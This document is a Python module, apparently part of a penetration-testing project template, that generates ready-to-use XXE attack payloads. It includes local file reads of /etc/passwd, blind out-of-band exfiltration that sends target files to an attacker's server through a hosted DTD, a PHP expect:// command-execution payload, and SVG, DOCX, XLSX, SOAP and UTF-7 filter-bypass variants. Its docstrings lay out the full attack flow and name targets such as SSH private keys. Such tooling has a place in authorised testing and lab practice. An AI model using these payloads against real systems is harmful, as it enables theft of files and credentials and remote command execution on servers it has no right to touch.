#!/usr/bin/env python3
"""XXE (XML External Entity) payload generator for quick POC development

XXE Primer:
-----------
XXE attacks exploit XML parsers that process external entity references.
Think of it as "XML includes" that can read files or make requests.

Two main types:
1. Basic XXE: File content appears in response (use basic_file_read())
2. Blind XXE: No direct output, exfiltrate via callbacks (use blind_oob())

For blind XXE you need:
- A payload to send to target (tells target to fetch your DTD)
- A DTD file on YOUR server (tells target what file to steal)
- Your server running to capture the stolen data

Quick start:
    # Generate everything
    xxe, dtd = generate_oob_files("http://10.10.14.5:8000")

    # Send payload to target
    payload = quick_test("http://10.10.14.5:8000")
    requests.post("http://vulnerable/api", data=payload)

    # Get the stolen data
    from utils.server_hooks import get_exfil
    data = get_exfil()
"""

from typing import Optional
from pathlib import Path
from urllib.parse import urlparse

from {{cookiecutter.project_slug}}.utils.paths import get_payloads_dir
from {{cookiecutter.project_slug}}.utils.output import out


def _normalize_url(base_url: str, path: str = "") -> str:
    """Helper to create clean URLs from base URL"""
    # Remove trailing slash from base
    base = base_url.rstrip('/')
    # Remove leading slash from path
    if path:
        path = path.lstrip('/')
        return f"{base}/{path}"
    return base


def basic_file_read(file_path: str = "/etc/passwd", entity_name: str = "xxe") -> str:
    """Basic XXE to read local files - SIMPLE but often BLOCKED

    This is the simplest XXE attack. The file content appears directly
    in the XML response. Use this when:
    - The app returns/displays the parsed XML
    - The app shows error messages with entity content
    - You're testing if XXE works at all

    Won't work if:
    - The app doesn't return XML content (blind XXE)
    - File has special characters that break XML
    - File is too large
    - Firewall blocks file:// protocol

    For blind scenarios, use blind_oob() instead.

    Args:
        file_path: Local file on target to read
        entity_name: Name of XML entity (rarely need to change)

    Returns:
        Simple XXE payload - file content appears in response

    Examples:
        ... payload = basic_file_read("/etc/passwd")
        >>> # If vulnerable, response will contain passwd file
    """
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY {entity_name} SYSTEM "file://{file_path}">]>
<root>&{entity_name};</root>'''


def blind_oob(base_url: str, file_path: str = "/etc/passwd", dtd_path: str = "xxe/xxe.dtd") -> str:
    """Blind XXE with out-of-band (OOB) exfiltration via external DTD

    This is the MAIN payload you send to the vulnerable target. It tells the
    target's XML parser to fetch your malicious DTD file from YOUR server.

    How it works:
    1. Target parses this XML → sees external DTD reference
    2. Target fetches DTD from YOUR server (base_url/xxe/xxe.dtd)
    3. DTD contains instructions to read local file and send to you
    4. Target's data gets exfiltrated to your server

    Args:
        base_url: Your server URL (e.g., http://10.10.14.5:8000)
        file_path: File to steal from target (e.g., /etc/passwd, /home/user/.ssh/id_rsa)
        dtd_path: Path where DTD is served from your server

    Returns:
        XML payload to send to the vulnerable target

    Examples:
        ... payload = blind_oob("http://10.10.14.5:8000")
        >>> # Send this payload to the target's XML endpoint
    """
    dtd_url = _normalize_url(base_url, dtd_path)
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{dtd_url}"> %xxe;]>
<root></root>'''


def oob_dtd(base_url: str, file_path: str = "/etc/passwd", filename: str = "xxe.dtd") -> str:
    """Generate AND write the external DTD file to payloads/xxe/

    This DTD file MUST be served from your web server for blind XXE to work.
    So we automatically write it to the correct location!

    The DTD contains instructions to:
    1. Read the local file from the target system
    2. Send that file content back to your server

    Args:
        base_url: Your server URL where you want data sent
        file_path: File to steal from target system
        filename: DTD filename (default: xxe.dtd)

    Returns:
        Relative path where DTD was written (e.g., "xxe/xxe.dtd")

    Examples:
        >>> # Automatically writes to payloads/xxe/xxe.dtd
        >>> dtd_path = oob_dtd("http://10.10.14.5:8000", "/etc/passwd")
        >>> # DTD is now ready to be served!

    Note:
    Note:
        &#x25; is XML entity for % - prevents premature parsing
    """
    # Generate the DTD content
    exfil_url = _normalize_url(base_url, "queue")
    dtd_content = f'''<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{exfil_url}?exfil=%file;'>">
%eval;
%exfil;'''

    # Write it to the payloads directory
    dtd_path = write_payload(filename, dtd_content, "xxe")
    out.success(f"DTD written to {dtd_path} → {base_url}/{dtd_path}")

    return dtd_path


def parameter_entity(base_url: str, file_path: str = "/etc/passwd") -> str:
    """XXE using parameter entities - self-contained blind XXE (no external DTD needed!)

    This is clever: instead of hosting a DTD file, we embed it using data: URI.
    Everything happens in one payload - no need to serve files!

    Use this when:
    - You can't/don't want to host a DTD file
    - Firewall blocks outbound HTTP but allows file:// protocol
    - You want a self-contained attack

    Args:
        base_url: Your server URL for receiving exfiltrated data
        file_path: File to steal from target

    Returns:
        Self-contained XXE payload with embedded DTD

    Examples:
        ... payload = parameter_entity("http://10.10.14.5:8000")
        >>> # One payload does everything - no DTD file needed!
    """
    exfil_url = _normalize_url(base_url, "queue")
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % dtd SYSTEM "data:text/plain,<!ENTITY send SYSTEM '{exfil_url}?exfil=%file;'>">
%dtd;
]>
<root>&send;</root>'''


def expect_wrapper(command: str = "id") -> str:
    """XXE using PHP expect wrapper (requires PHP expect module)"""
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://{command}">]>
<root>&xxe;</root>'''


def php_filter_b64(file_path: str = "/etc/passwd") -> str:
    """XXE using PHP filter wrapper - reads files as base64 (PHP targets only!)

    Why base64? Some files contain characters that break XML parsing:
    - Binary files (images, executables)
    - Files with < > & characters
    - Files with null bytes

    Base64 encoding makes ANY file safe to include in XML.
    You'll need to base64 decode the result to get the actual file.

    Only works if:
    - Target is PHP application
    - PHP has filter wrapper enabled (usually is)

    Args:
        file_path: File to read (will be base64 encoded)

    Returns:
        XXE payload using PHP filter wrapper

    Examples:
        ... payload = php_filter_b64("/var/www/config.php")
        >>> # Response will contain base64 encoded file
        >>> # Decode with: base64.b64decode(response_text)
    """
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
<root>&xxe;</root>'''


def svg_xxe(base_url: str, file_path: str = "/etc/passwd") -> str:
    """XXE in SVG format - useful for upload/image processors"""
    exfil_url = _normalize_url(base_url, "queue")
    return f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY xxe SYSTEM "{exfil_url}?exfil={file_path}" >
]>
<svg width="400px" height="100px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>'''


def docx_xxe(base_url: str, dtd_path: str = "xxe/xxe.dtd") -> str:
    """XXE payload for DOCX files (goes in word/document.xml)"""
    dtd_url = _normalize_url(base_url, dtd_path)
    return f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "{dtd_url}">%remote;]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p><w:r><w:t>Test</w:t></w:r></w:p>
</w:body>
</w:document>'''


def xlsx_xxe(base_url: str, dtd_path: str = "xxe/xxe.dtd") -> str:
    """XXE payload for XLSX files (goes in xl/workbook.xml)"""
    dtd_url = _normalize_url(base_url, dtd_path)
    return f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "{dtd_url}">%remote;]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheets><sheet name="Sheet1" sheetId="1"/></sheets>
</workbook>'''


def soap_xxe(base_url: str, file_path: str = "/etc/passwd") -> str:
    """XXE in SOAP envelope"""
    exfil_url = _normalize_url(base_url, "queue")
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{exfil_url}?exfil={file_path}">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<foo>&xxe;</foo>
</soap:Body>
</soap:Envelope>'''


def jar_protocol(jar_url: str) -> str:
    """XXE using jar: protocol for Java apps"""
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:{jar_url}!/">]>
<root>&xxe;</root>'''


def utf7_bypass(file_path: str = "/etc/passwd") -> str:
    """XXE using UTF-7 encoding to bypass filters"""
    return f'''<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo+AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file://{file_path}+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADsAPA-/root+AD4-'''


def write_payload(filename: str, content: str, subdir: str = "xxe") -> str:
    """Write payload to payloads/xxe/ directory

    Returns: Relative path for serving (e.g., "xxe/payload.xml")
    """
    payload_dir = get_payloads_dir() / subdir
    payload_dir.mkdir(parents=True, exist_ok=True)

    filepath = payload_dir / filename
    filepath.write_text(content)

    out.info(f"XXE payload written to {filepath}")

    # Return relative path for serving
    return f"{subdir}/{filename}"


def generate_oob_files(base_url: str, file_path: str = "/etc/passwd") -> tuple[str, str]:
    """Generate BOTH files needed for blind XXE attack - convenient helper!

    Blind XXE requires TWO things:
    1. XXE payload → You send this to the target
    2. DTD file → Automatically written to payloads/xxe/xxe.dtd

    Complete attack flow:
    ┌─────────────────────────────────────────────────┐
    │ 1. You run: generate_oob_files("http://IP:8000") │
    │    Creates: payloads/xxe/oob-xxe.xml             │
    │    Creates: payloads/xxe/xxe.dtd                 │
    │                                                   │
    │ 2. Start your server: python servers/server.py   │
    │    (This serves the xxe.dtd file)                │
    │                                                   │
    │ 3. Send oob-xxe.xml content to target's XML API  │
    │                                                   │
    │ 4. Target processes XML → fetches your xxe.dtd   │
    │    → reads local file → sends to your server     │
    │                                                   │
    │ 5. Check your server logs or use get_exfil()     │
    └─────────────────────────────────────────────────┘

    Args:
        base_url: Your server URL (e.g., http://10.10.14.5:8000)
        file_path: File to steal from target (e.g., /etc/passwd)

    Returns:
        Tuple: (xxe_payload_path, dtd_file_path)
        - xxe_payload_path: Send this content to target
        - dtd_file_path: Automatically served from your server

    Examples:
        >>> # Generate everything
        >>> xxe, dtd = generate_oob_files("http://10.10.14.5:8000")

        >>> # Read and send the XXE payload
        >>> with open(f"payloads/{xxe}") as f:
        ...     payload = f.read()
        >>> requests.post("http://target/api", data=payload)

        >>> # Get the stolen data
        >>> data = get_exfil()
    """
    # Generate and write the DTD (automatically writes to disk)
    dtd_file = oob_dtd(base_url, file_path)

    # Write the main XXE payload
    xxe_payload = blind_oob(base_url, file_path)
    xxe_file = write_payload("oob-xxe.xml", xxe_payload)

    return xxe_file, dtd_file


def quick_test(base_url: str, file_path: str = "/etc/passwd") -> str:
    """Quick XXE test - sets up everything and returns payload

    This is the FASTEST way to test XXE:
    1. Automatically creates the DTD file
    2. Returns the XXE payload ready to send

    Perfect for quick testing when you just found an XML endpoint.

    Args:
        base_url: Your server URL (e.g., http://10.10.14.5:8000)
        file_path: File to steal (default: /etc/passwd)

    Returns:
        XXE payload string to send to target

    Examples:
        >>> # One function does everything!
        >>> payload = quick_test("http://10.10.14.5:8000")

        >>> # DTD is written, payload is ready - just send it:
        ... requests.post("http://target/api", data=payload)

        >>> # Get the result:
        ... print(get_exfil())
    """
    # Write the DTD file automatically
    oob_dtd(base_url, file_path)

    # Return the payload that references it
    return blind_oob(base_url, file_path)


if __name__ == "__main__":
    # Quick test
    test_url = "http://10.10.14.5:8080"

    print("XXE Payloads for testing:")
    print("\n=== Basic file read ===")
    print(basic_file_read("/etc/passwd"))

    print("\n=== Blind OOB (main payload) ===")
    print(blind_oob(test_url))

    print("\n=== DTD file (save as xxe.dtd) ===")
    print(oob_dtd(test_url))

    print("\n=== PHP Filter (base64) ===")
    print(php_filter_b64("/etc/passwd"))

    print("\n=== SVG XXE ===")
    print(svg_xxe(test_url))

    print("\n=== Usage ===")
    print("1. Start log collector: python servers/log_collector.py")
    print("2. Generate OOB files: generate_oob_files('http://your-ip:8080')")
    print("3. Serve DTD with: python servers/http_server.py")
    print("4. Send XXE payload to target")
    print("5. Check logs: tail -f logs/collector.ndjson | jq .")
